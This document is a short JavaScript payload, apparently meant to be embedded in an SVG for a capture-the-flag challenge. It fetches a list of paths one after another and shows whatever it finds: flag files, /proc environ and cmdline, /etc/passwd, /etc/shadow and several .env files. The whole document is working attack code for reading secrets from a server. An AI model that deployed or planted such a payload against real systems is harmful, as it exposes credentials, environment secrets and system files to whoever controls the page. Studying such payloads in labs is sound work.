svg.script:
const paths = [
  '/flag',
  '/flags/flag.txt',
  '/flag.txt',
  '/root/flag.txt',
  '/etc/flag.txt',
  '/home/flag.txt',
  '/var/www/flag.txt',
  '/flag.txt.bak',
  '/.flag.txt',
  '/flag.txt.swp',
  '/flag.txt~',
  '/proc/self/environ',
  '/proc/1/environ',
  '/proc/self/cmdline',
  '/proc/1/cmdline',
  '/etc/passwd',
  '/etc/shadow',
  '/.env',
  '/config/.env',
  '/app/.env'
];

let currentIndex = 0;

function tryNextPath() {
  if (currentIndex >= paths.length) {
    document.getElementById('flagText').textContent = 'No flag found in common locations';
    return;
  }

  const path = paths[currentIndex];
  document.getElementById('flagText').textContent = `Trying: ${path}`;

  fetch(path)
    .then(r => r.text())
    .then(t => {
      document.getElementById('flagText').textContent = `Found content at ${path}:\n${t}`;
    })
    .catch(e => {
      currentIndex++;
      setTimeout(tryNextPath, 500);
    });
}

tryNextPath();
